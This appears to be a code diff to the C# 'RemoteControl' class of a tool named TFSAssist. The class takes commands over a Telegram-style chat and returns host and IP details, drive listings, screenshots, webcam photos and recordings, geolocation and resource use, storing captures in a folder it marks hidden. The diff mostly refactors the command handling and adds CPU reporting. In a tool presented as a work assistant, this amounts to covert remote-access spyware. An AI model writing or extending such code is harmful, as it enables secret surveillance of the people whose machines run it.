@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Device.Location;
+using System.Diagnostics;
 using System.Drawing.Imaging;
 using System.IO;
 using System.IO.Compression;
@@ -23,6 +24,25 @@ using Utils.WinForm.MediaCapture;
 
 namespace TFSAssist
 {
+    public enum RemoteControlCommands
+    {
+        PING,
+        COMMANDS,
+        INFO,
+        LOG,
+        DRIVE,
+        SCREEN,
+        CPU,
+        RESTART,
+        UPDATE,
+        LOC,
+        CAMINFO,
+        CAMSETT,
+        ACAM,
+        ECAM,
+        PHOTO
+    }
+
     public class RemoteControl : IDisposable
     {
         class TTLControl : TLControl
@@ -66,6 +86,8 @@ namespace TFSAssist
 
         public bool IsEnabled { get; private set; } = false;
 
+        private Dictionary<string, RemoteControlCommands> AllCommands { get; } = new Dictionary<string, RemoteControlCommands>(StringComparer.CurrentCultureIgnoreCase);
+
         public RemoteControl(Thread mainThread, string clientId, Action checkUpdates, Func<string> getLogs)
         {
             MainThread = mainThread;
@@ -74,13 +96,17 @@ namespace TFSAssist
             _getLogs = getLogs;
             ClientID = clientId;
             TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
+            foreach (RemoteControlCommands command in Enum.GetValues(typeof(RemoteControlCommands)))
+            {
+                AllCommands.Add(command.ToString("G"), command);
+            }
         }
 
         public async Task<bool> Initialize()
         {
             InitGeoWatcher();
             await InitTempSession();
-            await InitDirectory(TempDirectory);
+            await InitTempDirectory(TempDirectory);
 
             InitCamCapture(TempDirectory); // только после InitTempDirectory
 
@@ -233,30 +259,36 @@ namespace TFSAssist
 
             try
             {
-                foreach (var tlMessage in newMessages)
+                foreach (var tl_message in newMessages)
                 {
-                    if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
+                    if (tl_message.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                     {
-                        string command = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
+                        string strCommand = tl_message.Message.Substring(isCommand.Length, tl_message.Message.Length - isCommand.Length);
                         Dictionary<string, string> options = null;
-                        int optStart = command.IndexOf('(');
-                        int optEnd = command.IndexOf(')');
+                        int optStart = strCommand.IndexOf('(');
+                        int optEnd = strCommand.IndexOf(')');
                         if (optStart != -1 && optEnd != -1 && optEnd > optStart)
                         {
-                            string strOptions = command.Substring(optStart, command.Length - optStart);
+                            string strOptions = strCommand.Substring(optStart, strCommand.Length - optStart);
                             options = ReadOptionParams(strOptions);
-                            command = command.Substring(0, optStart);
+                            strCommand = strCommand.Substring(0, optStart);
                         }
-                        command = command.ToLower().Trim();
+                        strCommand = strCommand.Trim();
 
+                        if(!AllCommands.TryGetValue(strCommand, out var command))
+                            continue;
 
                         switch (command)
                         {
-                            case "ping":
+                            case RemoteControlCommands.PING:
                                 SendMessageToCurrentUser(GetCurrentServerInfo(true));
                                 break;
 
-                            case "info":
+                            case RemoteControlCommands.COMMANDS:
+                                SendMessageToCurrentUser(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
+                                break;
+
+                            case RemoteControlCommands.INFO:
                                 var res = WIN32.GetDetailedHostInfo();
                                 if (res?.Count > 0)
                                 {
@@ -285,7 +317,7 @@ namespace TFSAssist
                                 }
                                 break;
 
-                            case "log":
+                            case RemoteControlCommands.LOG:
                                 string logs = GetProcessingLogs();
                                 if (logs.IsNullOrEmptyTrim())
                                 {
@@ -302,7 +334,7 @@ namespace TFSAssist
 
                                 break;
 
-                            case "drive":
+                            case RemoteControlCommands.DRIVE:
                                 var drives = DriveInfo.GetDrives();
                                 if (drives == null || drives.Length == 0)
                                     break;
@@ -319,24 +351,35 @@ namespace TFSAssist
                                 SendMessageToCurrentUser(result);
                                 break;
 
-                            case "screen":
+                            case RemoteControlCommands.SCREEN:
                                 string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.pam");
                                 await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                 break;
 
-                            case "cpu":
-                                // TODO current process cpu
+                            case RemoteControlCommands.CPU:
+
+                                Process proc = Process.GetCurrentProcess();
+
+                                var totalCPU = (int)SERVER.GetCpuUsage();
+                                var totalMem = SERVER.GetTotalMemoryInMiB();
+                                var avalMem = SERVER.GetPhysicalAvailableMemoryInMiB();
+
+                                var appCPUUsage = (int)SERVER.GetCpuUsage(proc);
+                                string appMemUsage = SERVER.GetMemUsage(proc).ToFileSize();
+
+                                SendMessageToCurrentUser($"CPU=[{appCPUUsage}%] Mem=[{appMemUsage}] TotalCPU=[{totalCPU}%] TotalMem=[{totalMem} MB] FreeMem=[{avalMem} MB]");
+
                                 break;
 
-                            case "restart":
+                            case RemoteControlCommands.RESTART:
                                 // TODO restart current app
                                 break;
 
-                            case "update":
+                            case RemoteControlCommands.UPDATE:
                                 isUpdate = true;
                                 break;
 
-                            case "loc":
+                            case RemoteControlCommands.LOC:
                                 if (_locationResult.IsNullOrEmptyTrim())
                                 {
                                     SendMessageToCurrentUser("Location unknown.");
@@ -349,7 +392,7 @@ namespace TFSAssist
                                 }
                                 break;
 
-                            case "caminfo":
+                            case RemoteControlCommands.CAMINFO:
                                 string resultCamInfo = string.Empty;
                                 if (_aforgeDevices != null)
                                 {
@@ -364,12 +407,12 @@ namespace TFSAssist
                                 resultCamInfo = resultCamInfo.Trim();
 
                                 if (resultCamInfo.IsNullOrEmptyTrim())
-                                    SendMessageToCurrentUser("No devices initialized.");
+                                    SendMessageToCurrentUser("No device found.");
                                 else
                                     SendMessageToCurrentUser(resultCamInfo);
                                 break;
 
-                            case "camsett":
+                            case RemoteControlCommands.CAMSETT:
                                 int exceptionCount = 0;
                                 if (options != null && options.Count > 0)
                                 {
@@ -393,7 +436,7 @@ namespace TFSAssist
                                         catch (Exception ex)
                                         {
                                             exceptionCount++;
-                                            WriteExLog($"AForgeException: {ex.Message}");
+                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                         }
 
                                         try
@@ -403,7 +446,7 @@ namespace TFSAssist
                                         catch (Exception ex)
                                         {
                                             exceptionCount++;
-                                            WriteExLog($"EncoderException: {ex.Message}");
+                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                         }
                                     }
 
@@ -416,7 +459,7 @@ namespace TFSAssist
                                         catch (Exception ex)
                                         {
                                             exceptionCount++;
-                                            WriteExLog($"EncoderException: {ex.Message}");
+                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                         }
                                     }
 
@@ -428,10 +471,10 @@ namespace TFSAssist
 
                                 break;
 
-                            case "acam":
+                            case RemoteControlCommands.ACAM:
                                 if (_aforgeCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"AForge not initialized.");
+                                    SendMessageToCurrentUser($"{nameof(AForgeCapture)} not initialized.");
                                     break;
                                 }
 
@@ -439,10 +482,10 @@ namespace TFSAssist
 
                                 break;
 
-                            case "ecam":
+                            case RemoteControlCommands.ECAM:
                                 if (_encoderCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"Encoder not initialized.");
+                                    SendMessageToCurrentUser($"{nameof(EncoderCapture)} not initialized.");
                                     break;
                                 }
 
@@ -450,10 +493,10 @@ namespace TFSAssist
 
                                 break;
 
-                            case "photo":
+                            case RemoteControlCommands.PHOTO:
                                 if (_aforgeCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"AForge not initialized.");
+                                    SendMessageToCurrentUser($"{nameof(AForgeCapture)} not initialized.");
                                     break;
                                 }
 
@@ -467,11 +510,11 @@ namespace TFSAssist
                                 break;
                         }
                     }
-                    else if (tlMessage.Message.Like("ping"))
+                    else if (tl_message.Message.Like("ping"))
                     {
                         SendMessageToCurrentUser(GetCurrentServerInfo());
                     }
-                    else if (tlMessage.Message.Like("update"))
+                    else if (tl_message.Message.Like("update"))
                     {
                         isUpdate = true;
                     }
@@ -496,6 +539,7 @@ namespace TFSAssist
         void SendPreparedFiles(string projectDirPath)
         {
             var tempFiles = Directory.EnumerateFiles(projectDirPath);
+
             if (tempFiles.Any())
             {
                 try
@@ -638,9 +682,9 @@ namespace TFSAssist
                 var hostName = Dns.GetHostName();
 
                 if (detailed)
-                    return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
+                    return $"Host=[{hostName}] Thread=[{(MainThread.IsAlive ? MainThread.ManagedThreadId.ToString() : "Aborted")}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
 
-                return $"Host=[{hostName}] Thread=[IsAlive={MainThread.IsAlive}; ID={MainThread.ManagedThreadId}]";
+                return $"Host=[{hostName}] Thread=[{(MainThread.IsAlive ? MainThread.ManagedThreadId.ToString() : "Aborted")}]";
             }
             catch (Exception)
             {
@@ -739,17 +783,19 @@ namespace TFSAssist
             }
         }
 
-        async Task InitDirectory(string dirPath)
+        async Task InitTempDirectory(string tempDirPath)
         {
-            var di = new DirectoryInfo(dirPath);
+            var di = new DirectoryInfo(tempDirPath);
+
             if (di.Exists)
             {
                 try
                 {
                     //await IO.DeleteReadOnlyDirectoryAsync(dirPath);
 
+                    DeleteAllFilesInDirectory(tempDirPath);
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-                    DeleteAllFilesInDirectory(dirPath);
+                    
                 }
                 catch (Exception ex)
                 {
@@ -758,7 +804,7 @@ namespace TFSAssist
             }
             else
             {
-                await CreateDirectory(dirPath);
+                await CreateDirectory(tempDirPath);
             }
         }
 
@@ -878,6 +924,10 @@ namespace TFSAssist
             if (sender is IMediaCapture mediaCapture)
             {
                 SendPreparedFiles(mediaCapture.DestinationDir);
+            }
+            else
+            {
+                WriteExLog($"Sender is not [{nameof(IMediaCapture)}] when recording completed.");
             }
         }
 
